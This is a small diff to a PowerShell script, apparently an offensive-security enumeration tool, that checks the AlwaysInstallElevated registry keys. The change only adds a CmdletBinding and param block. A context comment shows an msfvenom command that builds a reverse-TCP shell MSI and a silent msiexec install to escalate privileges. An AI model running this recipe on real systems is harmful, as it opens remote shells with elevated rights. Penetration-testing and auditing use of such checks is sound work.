@@ -6,6 +6,9 @@
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=a LPORT=p -f msi -o p.msi
         msiexec /quiet /qn /i p.msi
 #>
+[CmdletBinding()]
+param()
+
 $hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
 $hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
 
